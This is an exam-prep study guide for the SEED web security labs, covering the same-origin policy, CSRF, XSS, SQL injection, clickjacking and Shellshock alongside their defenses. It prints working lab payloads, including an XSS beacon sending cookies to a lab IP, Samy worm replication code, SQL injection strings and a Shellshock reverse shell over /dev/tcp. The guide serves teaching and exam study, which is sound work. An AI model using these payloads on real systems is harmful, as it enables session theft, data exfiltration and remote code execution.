# SEED Web Security & System Exploitation: High-Density 2-Hour Exam Prep Guide

---

## ⏱️ 2-Hour Study Master Timeline

```
[00:00 - 00:25] ──► Block 1: Web Architecture, HTTP Mechanics & Same-Origin Policy (W01)
[00:25 - 00:50] ──► Block 2: Cross-Site Request Forgery (CSRF) & Ambient Auth (W02, Lab 03)
[00:50 - 01:15] ──► Block 3: Cross-Site Scripting (XSS), Worms & CSP Directives (W03, Lab 02)
[01:15 - 01:35] ──► Block 4: SQL Injection (SQLi) & Parameterized Queries (W04, Lab 01)
[01:35 - 01:50] ──► Block 5: Clickjacking (UI Redress) & Framing Sandboxes (W05, Lab 04)
[01:50 - 02:00] ──► Block 6: Shellshock (CVE-2014-6271, Lab 05) & High-Yield MCQ Trap Matrix
```

---

## BLOCK 1: Web Architecture, HTTP Mechanics & Same-Origin Policy (Minutes 00–25)

### 1. Core Concept Breakdown

```
        CLIENT (Browser)                                    SERVER (Apache / PHP)
  ┌───────────────────────────┐                         ┌───────────────────────────┐
  │  HTML / DOM / JavaScript  │   ─── HTTP Request ───► │  HTTP Server (Apache)     │
  │  Cookie Store (Per-Domain)│   ◄── HTTP Response ──  │  CGI / PHP Runtime Engine │
  └───────────────────────────┘                         └─────────────┬─────────────┘
                ▲                                                     │ SQL
                │ JavaScript Execution                                ▼
         Browser Sandbox                                  Database (MySQL 8.x)
```

* **Stateless HTTP Protocol**: HTTP does not maintain a persistent connection or session state between requests. Every request is completely independent.
* **Cookies**:
  * *Mechanism*: Key-value pairs set by the server via `Set-Cookie: name=value; [attributes]` and saved by the browser. The browser automatically attaches matching cookies in the `Cookie: name=value` header on every subsequent request to that domain.
  * *First-Party vs. Third-Party*: First-party cookies match the exact domain in the address bar. Third-party cookies belong to external origins (e.g., ad networks or trackers embedded via `<img>`, `<iframe>`, or `<script>`).
  * *Session Cookies*: A random, cryptographically secure identifier (`Session ID`) stored in a client cookie mapping to state kept on the server.
* **Same-Origin Policy (SOP)**:
  * *Definition of Origin*: `Origin = Scheme (Protocol) + Hostname + Port`.
  * *Rule*: Origin A (`http://example.com:80`) cannot read DOM nodes, cookies, or Ajax responses belonging to Origin B (`https://example.com:80` [different scheme] or `http://api.example.com:80` [different host] or `http://example.com:8080` [different port]).

---

### 2. Network & Sandbox Nuances: Ajax vs. WebSocket

```
+--------------------------------------------------------------------------------------------------+
| AJAX (XMLHttpRequest / Fetch API)                     | WEBSOCKET (RFC 6455)                     |
+--------------------------------------------------------------------------------------------------+
| • Half-duplex (Request -> Response cycle).            | • Full-duplex persistent TCP connection. |
| • SOP is enforced by the BROWSER.                     | • SOP is NOT enforced by the browser!    |
| • CRITICAL MCQ RULE: The cross-origin request IS      | • Browser allows cross-origin connection |
|   sent and executed by the server; the browser        |   establishment regardless of origin.    |
|   BLOCKS the JavaScript from READING the response!   | • Access control is purely SERVER-SIDE   |
| • Relaxed via CORS (`Access-Control-Allow-Origin`).   |   via validation of the `Origin:` header.|
+--------------------------------------------------------------------------------------------------+
```

#### The Cable Haunt Attack Case Study (Slide W01.35)
* **What happened**: Broadcom cable modems hosted a local WebSocket server listening on the LAN.
* **How it worked**: A victim visited a malicious website. The malicious script initiated a local WebSocket connection (`ws://192.168.100.1`) directly from the victim's browser to the modem's internal IP.
* **Why it succeeded**: The modem failed to validate the `Origin:` header on incoming WebSocket connections, exposing an internal buffer overflow vulnerability to public web execution.

---

### 3. Highly Testable Commands & Configuration Flags

```bash
# Verify virtual host definitions and listening sockets inside Apache container
apache2ctl -S
netstat -tlnp

# Observe complete HTTP Request/Response exchange with verbose headers
curl -v -H "Host: www.seed-server.com" http://127.0.0.1:10080/
```

* `-v` (Verbose): Prints request lines (`>`), outgoing headers, incoming status (`<`), and response headers.
* `-H` (Custom Header): Overrides or sets specific HTTP headers (vital for testing Name-based Virtual Hosts).

---

### 4. MCQ Critical Traps & Nuances: Web Basics

> [!WARNING]
> **Trap 1: "Does the Same-Origin Policy stop the server from executing a cross-origin Ajax request?"**  
> **NO!** The browser sends the HTTP request to the remote server, and the remote server executes it. The browser's SOP engine intercepts and blocks the **response data** from being read by the requesting script.

> [!WARNING]
> **Trap 2: "Can JavaScript access local filesystem files if it knows the absolute path?"**  
> **NO!** Browser sandboxing strictly blocks direct filesystem access (`file:///etc/passwd`). JavaScript can only read local files if the user explicitly interacts with a file picker dialog (`<input type="file">`).

---

## BLOCK 2: Cross-Site Request Forgery (CSRF) (Minutes 25–50)

### 1. Core Concept Breakdown

```
    VICTIM BROWSER (Holds valid elggperm session cookie for seed-server.com)
         │
         ├───────────────────────────────────────────────┐
         │ 1. Visits Malicious Page                      │ 2. Invisible Auto-Request (GET / POST)
         ▼                                               ▼    (Cookie attached automatically!)
┌───────────────────────────────┐               ┌─────────────────────────────────────────┐
│ www.attacker32.com:81         │               │ www.seed-server.com:80                  │
│ Hosted by Samy (GUID 59)      │               │ Target Elgg Social Network              │
│ Payload: Hidden Image or Form │               │ Action: Add Friend (59) or Edit Profile │
└───────────────────────────────┘               └─────────────────────────────────────────┘
```

* **What it is**: An attack that tricks an authenticated victim's browser into executing unwanted, state-changing actions on a trusted web application.
* **Why it happens (Ambient Authority)**: Browsers automatically attach all cookies belonging to a target domain to *any* request destined for that domain, regardless of which website initiated the request.
* **Consequence**: The target server cannot differentiate between an intentional user request and an attacker-forged request.

---

### 2. SEED Lab Workflow & Directory Anatomy: Lab 03 ([labs/03-csrf](file:///C:/Users/HabiburRahmanShalin/workstation/shaleen/iit/cyber_security/seed-web-security-docker/labs/03-csrf/docker-compose.yml))

#### Directory & Service Architecture
* `elgg-10.9.0.5-csrf` (`10.22.0.5`, mapped to host port `10082` / `80`): Target Elgg engine.
* `attacker-10.9.0.105` (`10.22.0.105`, mapped to host port `10083` / `81`): Malicious attacker server.
* `mysql-10.9.0.6-csrf` (`10.22.0.6`): Elgg MySQL backend (`elgg_seed`).

#### Exploitation Tasks & Payloads

```html
<!-- TASK 2: GET-based CSRF (Add Friend) -->
<!-- Attacker embeds an invisible tracking pixel pointing to state-changing GET endpoint -->
<img src="http://www.seed-server.com/action/friends/add?friend=59" width="1" height="1" style="display:none;" />
```

```html
<!-- TASK 3: POST-based CSRF (Profile Tampering) -->
<!-- Hidden HTML form automatically submitted by JavaScript on window load -->
<form id="csrf-post" action="http://www.seed-server.com/action/profile/edit" method="POST">
    <input type="hidden" name="name" value="Alice" />
    <input type="hidden" name="description" value="SAMY is MY HERO" />
    <input type="hidden" name="accesslevel[description]" value="2" /> <!-- 2 = Public Access -->
    <input type="hidden" name="guid" value="56" />                   <!-- Alice's GUID -->
</form>
<script>
    document.getElementById('csrf-post').submit();
</script>
```

#### Database Verification Commands

```powershell
# Verify Friend Relationship (Task 2)
docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT guid_one, relationship, guid_two FROM elgg_entity_relationships WHERE guid_one = 56;"

# Verify Profile Tampering (Task 3)
docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT entity_guid, name, value FROM elgg_metadata WHERE entity_guid = 56 AND name = 'description';"
```

---

### 3. Defenses: Tokens vs. SameSite Cookies

#### A. Secret Synchronizer Token Pattern (Elgg Countermeasure)
* Server injects two secret fields into legitimate forms: `__elgg_ts` (timestamp) and `__elgg_token`.
* **Token Derivation Formula**:
  $$\text{Token} = \text{MD5}(\text{Site Secret} + \text{Timestamp} + \text{Session ID} + \text{Random Session String})$$
* **Why it works**: By the Same-Origin Policy, scripts running on `www.attacker32.com` **cannot read** DOM elements or JS variables on `www.seed-server.com`. The attacker cannot steal or predict the token.

#### B. SameSite Cookie Attribute

```http
Set-Cookie: session_id=xyz123; SameSite=[Strict | Lax | None]; Path=/; HttpOnly
```

| `SameSite` Mode | Cross-Site POST Requests | Cross-Site GET Requests (e.g., clicking link) | Cross-Site `<img>` GET Tags |
| :--- | :--- | :--- | :--- |
| **`Strict`** | ❌ **Blocked** (No cookie sent) | ❌ **Blocked** | ❌ **Blocked** |
| **`Lax`** (Default) | ❌ **Blocked** | ✅ **Sent** (Top-level navigation) | ❌ **Blocked** |
| **`None`** | ✅ **Sent** (Requires `Secure`) | ✅ **Sent** | ✅ **Sent** |

---

### 4. MCQ Critical Traps: CSRF

> [!WARNING]
> **Trap 1: "Does the `Referer` header provide a robust defense against CSRF?"**  
> **NO.** Browsers often strip or truncate `Referer` headers due to Referrer-Policy configurations (`no-referrer`), HTTPS-to-HTTP downgrades, or privacy extensions. Defending purely on `Referer` causes high false-positive rejections.

> [!WARNING]
> **Trap 2: "Can `SameSite=Lax` prevent all CSRF attacks?"**  
> **NO.** If a sensitive state-changing action (like transferring funds or adding a friend) is mistakenly implemented via HTTP **GET**, a top-level link click (`<a href="...">`) will still attach `SameSite=Lax` cookies!

---

## BLOCK 3: Cross-Site Scripting (XSS) & Content Security Policy (Minutes 50–75)

### 1. Core Concept Breakdown

```
Stored XSS:    Attacker ──[Payload in Profile Bio]──► Database ──[Raw Render]──► Victim Browser (Code Runs)
Reflected XSS: Attacker ──[Malicious Link with ?q=]─► Victim Clicks ──► Server Echoes ──► Victim Browser
```

* **What it is**: Injecting malicious client-side scripts into web pages viewed by other users.
* **Why it happens**: Unsanitized output rendering. The application mixes untrusted data with HTML/JS code channels.
* **Consequence**: The injected script runs under the victim's browser session with the permissions of the hosting origin, enabling cookie theft (`document.cookie`), web defacement, keylogging, and request forgery.

---

### 2. SEED Lab Workflow & Directory Anatomy: Lab 02 ([labs/02-xss](file:///C:/Users/HabiburRahmanShalin/workstation/shaleen/iit/cyber_security/seed-web-security-docker/labs/02-xss/docker-compose.yml))

#### Stored XSS Tasks & Payloads

```html
<!-- Task 1: Alert PoC -->
<script>alert('XSS');</script>

<!-- Task 2: Reading Session Cookies -->
<script>alert(document.cookie);</script>

<!-- Task 3: Exfiltrating Cookies via Beacon -->
<script>
    document.write('<img src="http://10.21.0.1:5555/?cookie=' + escape(document.cookie) + '" style="display:none;" />');
</script>
```

#### Self-Propagating XSS Worm: The Samy Worm (Tasks 5 & 6)
To propagate, the worm must copy its own source code into the victim's profile:
1. **DOM Approach**:
   ```javascript
   var wormCode = document.getElementById("worm").innerHTML;
   ```
2. **HTML Parser Trap Avoidance**:
   * If the payload writes `</script>` inside string literals, the browser's HTML parser closes the script block prematurely.
   * **Solution**: String splitting:
     ```javascript
     var tail = "</" + "script>";
     var fullPayload = '<script id="worm" type="text/javascript">' + wormCode + tail;
     ```
3. **Encoding for HTTP POST Body**:
   ```javascript
   var content = "&description=" + encodeURIComponent(fullPayload);
   ```

---

### 3. Content Security Policy (CSP) Deep Dive ([apache_csp.conf](file:///C:/Users/HabiburRahmanShalin/workstation/shaleen/iit/cyber_security/seed-web-security-docker/labs/02-xss/image_www/apache_csp.conf))

CSP is an HTTP response header that restricts the resources (scripts, images, frames) the browser is allowed to load and execute.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-111-111-111' *.example70.com;
```

```
           EVALUATION OF CSP DIRECTIVES (Lab 02 Task 8 Matrix)
┌──────────────────────────────────────────────┬───────────────┬───────────────────────────────┐
│ SCRIPT ELEMENT IN DOM                        │ RESULT        │ REASON                        │
├──────────────────────────────────────────────┼───────────────┼───────────────────────────────┤
│ <script nonce="111-111-111">...</script>     │ ✅ EXECUTED   │ Nonce matches header exactly. │
│ <script nonce="222-222-222">...</script>     │ ❌ BLOCKED    │ Nonce mismatch.               │
│ <script>alert(1)</script> (No nonce)         │ ❌ BLOCKED    │ Inline scripts disallowed.    │
│ <script src="script_area4.js"></script>      │ ✅ EXECUTED   │ Matches 'self' origin.        │
│ <script src="http://example60.com/..."></script> ❌ BLOCKED  │ example60 not whitelisted.    │
│ <script src="http://example70.com/..."></script> ✅ EXECUTED │ Matches *.example70.com.      │
│ <button onclick="alert(1)">Click</button>    │ ❌ BLOCKED    │ Inline event handlers blocked.│
└──────────────────────────────────────────────┴───────────────┴───────────────────────────────┘
```

---

### 4. Defenses: Filtering vs. Encoding

```php
// FLAWED: Blacklist filtering (bypassable via variations, <svg onload=...>, <img> onerror)
$clean = str_replace("<script>", "", $_GET['q']);

// SECURE: Context-Aware HTML Entity Encoding
echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
```

* `htmlspecialchars` converts:
  * `<` ➔ `&lt;`
  * `>` ➔ `&gt;`
  * `&` ➔ `&amp;`
  * `"` ➔ `&quot;`
  * `'` ➔ `&#039;` (when `ENT_QUOTES` flag is supplied)

---

### 5. MCQ Critical Traps: XSS vs. CSRF

> [!WARNING]
> **Trap 1: "Can Anti-CSRF Synchronizer Tokens defend against an XSS attack?"**  
> **ABSOLUTELY NOT!** In XSS, malicious JavaScript runs *inside* the victim's origin. The script can access the DOM, read `elgg.security.token`, grab `__elgg_ts`, and append valid tokens to any forged request!

> [!WARNING]
> **Trap 2: "Does the `HttpOnly` cookie flag prevent XSS vulnerabilities?"**  
> **NO.** `HttpOnly` only stops JavaScript from reading `document.cookie`. The injected XSS script can still deface the site, log keystrokes, or issue authenticated state-changing background Ajax requests.

---

## BLOCK 4: SQL Injection (SQLi) & Database Boundaries (Minutes 75–95)

### 1. Core Concept Breakdown

```
UNSAFE STRING CONCATENATION:
$sql = "SELECT * FROM credential WHERE Name='" . $user . "' AND Password='" . $pass . "'";

Input: admin'#
Result Query Tree:
   SELECT * FROM credential WHERE Name = 'admin' [COMMENT: #' AND Password='...']
   └── Evaluates to TRUE for admin without checking password!
```

* **What it is**: Injecting SQL syntax through user-supplied input.
* **Why it happens**: Conflation of control instructions (SQL syntax) and untrusted data in a single channel.
* **Consequences**: Authentication bypass, arbitrary data exfiltration via `UNION SELECT`, and database tampering via `UPDATE`/`INSERT`.

---

### 2. SEED Lab Workflow & Directory Anatomy: Lab 01 ([labs/01-sql-injection](file:///C:/Users/HabiburRahmanShalin/workstation/shaleen/iit/cyber_security/seed-web-security-docker/labs/01-sql-injection/docker-compose.yml))

#### Target Schema ([sqllab_users.sql](file:///C:/Users/HabiburRahmanShalin/workstation/shaleen/iit/cyber_security/seed-web-security-docker/labs/01-sql-injection/image_mysql/sqllab_users.sql))
Table `credential`: Columns `ID, Name, EID, Salary, Birthday, SSN, PhoneNumber, Address, Email, NickName, Password`.

#### Task Exploitation & Payloads

1. **Authentication Bypass (Task 2.1)**:
   * Input: `admin'#` or `admin' -- ` *(Notice the trailing space after `--`)*
   * Result: Strips the `AND Password=...` clause.
2. **Data Exfiltration via UNION SELECT (Task 2.2)**:
   * Condition: Number and datatypes of columns in the injected `SELECT` must match the original query.
   * Payload: `' UNION SELECT 1, Name, EID, Salary, Birthday, SSN, PhoneNumber, Address, Password FROM credential #`
3. **Data Modification via UPDATE Statement (Task 3)**:
   * Vulnerable Query: `UPDATE credential SET Salary=$salary WHERE Name='$name'`
   * Injected Salary: `150000 WHERE Name='Alice'; -- ` or modifying Alice's profile to alter Boby's salary.
4. **Stacked / Multiple Queries (Task 4)**:
   * Attempt: `admin'; DROP TABLE credential; #`
   * **Why it FAILS in PHP `mysqli`**: The default PHP API `mysqli::query()` sends requests via the MySQL protocol with multi-statement execution disabled. It throws a syntax error. Stacked queries only succeed if the developer explicitly calls `mysqli::multi_query()`.

---

### 3. Remediation: Prepared Statements (Parameterized Queries)

```php
// Step 1: Send query template (Code Channel) -> DB compiles & optimizes parse tree
$stmt = $conn->prepare("SELECT ID, Name, Salary FROM credential WHERE Name=? AND Password=?");

// Step 2: Bind user values strictly as data literals (Data Channel)
$stmt->bind_param("ss", $username, $password); // "ss" denotes two string parameters

// Step 3: Execute query
$stmt->execute();
$result = $stmt->get_result();
```

* **Why Prepared Statements are 100% Secure**: The database server compiles the SQL parse tree **before** the parameter values are bound. Any characters like `'`, `#`, or `UNION` inside `$username` are treated strictly as string literals, never as executable SQL control syntax.

---

### 4. MCQ Critical Traps: SQL Injection

> [!WARNING]
> **Trap 1: "Is `mysqli::real_escape_string()` just as secure as Prepared Statements?"**  
> **NO.** `real_escape_string()` only escapes quotes. If an injection occurs in a numeric field (e.g., `WHERE id = $id`), quotes are not required to alter the query logic (`$id = 1 OR 1=1`), leaving the query vulnerable!

> [!WARNING]
> **Trap 2: "In MySQL, can `--` be followed immediately by characters without a space?"**  
> **NO.** In MySQL syntax, `--` requires an immediate following space or control character (`-- `) to be parsed as a comment delimiter. A `#` requires no trailing space.

---

## BLOCK 5: Clickjacking (UI Redress) & Frame Sandboxing (Minutes 95–110)

### 1. Core Concept Breakdown

```
               USER MOUSE CLICK
                     │
                     ▼
  ┌──────────────────────────────────────────────┐
  │ Transparent Iframe Layer (z-index: 10)       │  <── Mouse click actually hits
  │ opacity: 0.0001                              │      "DELETE ACCOUNT" or "TRANSFER"!
  │ Target Site: www.cjlab.com:10084             │
  ├──────────────────────────────────────────────┤
  │ Decoy / Bait Layer (z-index: 1)              │  <── What the user THINKS
  │ Visible Green Button: "CLAIM FREE GIFT!"     │      they are clicking.
  └──────────────────────────────────────────────┘
```

* **What it is**: Tricking a user into clicking an actionable element on a sensitive website by overlaying it with an invisible iframe.
* **Why it happens**: Browsers permit third-party websites to embed pages inside `<iframe>` tags unless explicitly forbidden by HTTP response headers.

---

### 2. Defenses & Bypasses: Frame-Busting vs. Modern Headers

#### A. Legacy JavaScript Frame-Busting
```javascript
// Target site attempts to break out of iframe
if (top !== self) {
    top.location = self.location;
}
```
* **Bypass via HTML5 `sandbox` attribute**:
  ```html
  <!-- Attacker restricts iframe capabilities -->
  <iframe src="http://www.cjlab.com" sandbox="allow-forms allow-scripts"></iframe>
  ```
  Because the attacker **omits** `allow-top-navigation`, the browser blocks the frame-busting script from redirecting `top.location`, neutralizing the defense!

#### B. Robust Defenses: `X-Frame-Options` & CSP `frame-ancestors`

```http
# Legacy Header (Cannot specify multiple allowed origins)
X-Frame-Options: DENY                  # Disallow framing by any site
X-Frame-Options: SAMEORIGIN            # Allow framing only by pages on the exact same origin

# Modern Standard Header (Content Security Policy)
Content-Security-Policy: frame-ancestors 'none';                 # Equivalent to DENY
Content-Security-Policy: frame-ancestors 'self';                 # Equivalent to SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self' trusted.com;    # Supports whitelisting multiple origins!
```

---

### 3. MCQ Critical Traps: Clickjacking

> [!WARNING]
> **Trap 1: "Can `X-Frame-Options` or CSP `frame-ancestors` be set via `<meta>` HTML tags?"**  
> **NO.** Browsers ignore `X-Frame-Options` and `frame-ancestors` inside `<meta http-equiv="...">` tags. They **must** be sent as genuine HTTP response headers by the web server.

> [!WARNING]
> **Trap 2: "If both `X-Frame-Options` and CSP `frame-ancestors` are present, which takes precedence?"**  
> **CSP `frame-ancestors` supersedes `X-Frame-Options`** in all modern browsers.

---

## BLOCK 6: Shellshock (CVE-2014-6271) & Final MCQ Trap Matrix (Minutes 110–120)

### 1. Core Concept Breakdown

```
ATTACKER CURL REQUEST ──► APACHE WEB SERVER ──► CGI SCRIPT (vul.cgi)
User-Agent:               Maps HTTP headers     Starts Bash process
() { :;}; echo; /bin/id   to env variables:     Bash parses function & runs
                          HTTP_USER_AGENT       trailing commands! (RCE)
```

* **Root Cause**: GNU Bash (versions <= 4.3) allowed exporting function definitions via environment variables formatted as:
  ```bash
  VAR='() { :; }; <trailing_command>'
  ```
  Due to a parser bug in `variables.c`, Bash did not stop parsing when the function definition ended; it automatically executed all trailing commands upon shell instantiation.
* **CGI Vector**: Apache `mod_cgi` converts incoming HTTP client headers (`User-Agent`, `Referer`) into environment variables (`HTTP_USER_AGENT`, `HTTP_REFERER`) before invoking the CGI binary (`#!/bin/bash_shellshock`).

---

### 2. Exploitation Commands & Analysis

```powershell
# Proof of Concept / Remote Code Execution
curl.exe -H "User-Agent: () { :; }; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" http://localhost:10086/cgi-bin/vul.cgi

# Reverse Shell Payload
curl.exe -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1" http://localhost:10086/cgi-bin/vul.cgi
```

* `echo Content_type: text/plain; echo;`: Necessary when injecting via CGI so Apache outputs a valid HTTP response header before command stdout, preventing a `500 Internal Server Error`.
* **Fix**: Updating GNU Bash (version >= 4.4) ensures exported functions use internal prefix identifiers (e.g., `BASH_FUNC_name%%`) and stops executing arbitrary trailing tokens.

---

## 🎯 Master MCQ Trap & Nuance Comparison Matrix

| Exam Question Focus | Common Distractor / False Option | Absolute Technical Truth |
| :--- | :--- | :--- |
| **SOP on Ajax** | "SOP blocks the browser from sending cross-origin requests." | **False.** The request is sent and executed; the browser blocks JavaScript from **reading the response**. |
| **WebSocket Security** | "WebSocket connections are governed by browser Same-Origin Policy." | **False.** Browsers do NOT apply SOP to WebSockets. Access control is strictly **server-side** via the `Origin` header. |
| **XSS vs. CSRF Tokens** | "Anti-CSRF tokens mitigate XSS attacks." | **False.** Injected XSS runs within the origin and can read anti-CSRF tokens directly from DOM/variables. |
| **Cookie `HttpOnly`** | "`HttpOnly` prevents Cross-Site Scripting (XSS)." | **False.** `HttpOnly` only prevents reading `document.cookie`. Scripts can still deface pages, log keys, or forge actions. |
| **SameSite `Lax`** | "`SameSite=Lax` completely protects against all CSRF attacks." | **False.** `Lax` still sends cookies on top-level GET navigations (e.g., clicking a link). |
| **Multi-Statement SQLi** | "`admin'; DROP TABLE users; #` works in standard PHP MySQL queries." | **False.** PHP's `mysqli::query()` explicitly disallows stacked queries; `mysqli::multi_query()` is required. |
| **MySQL Comment Syntax**| "`--` comments out the rest of the line unconditionally." | **False.** In MySQL, `--` must be followed by a **space** or control character (`-- `). `#` does not need a space. |
| **Frame-Busting Scripts** | "JavaScript `if (top !== self)` provides reliable anti-framing." | **False.** Defeated by iframe HTML5 attribute `sandbox="allow-scripts allow-forms"` omitting `allow-top-navigation`. |
| **`X-Frame-Options` via Meta** | "`<meta http-equiv='X-Frame-Options' content='DENY'>` blocks framing." | **False.** Browsers ignore `X-Frame-Options` and `frame-ancestors` declared in `<meta>` tags; they must be HTTP headers. |
| **Shellshock Root Cause**| "Shellshock is a buffer overflow in the Linux kernel." | **False.** It is an environment variable function-parsing logic bug in GNU Bash (`variables.c`). |

---

## 🛠️ Rapid Docker Diagnostic & CLI Cheat Sheet

```bash
# Start lab in detached mode with forced image rebuild
docker compose up -d --build

# Inspect container status and port mappings
docker compose ps

# Access interactive bash inside target web container
docker exec -it <container_name> bash

# Direct MySQL query execution from host terminal
docker exec <mysql_container> mysql -u <user> -p<pass> <db_name> -e "<SQL_QUERY>"

# Tear down lab and purge persistent anonymous volumes
docker compose down -v
```
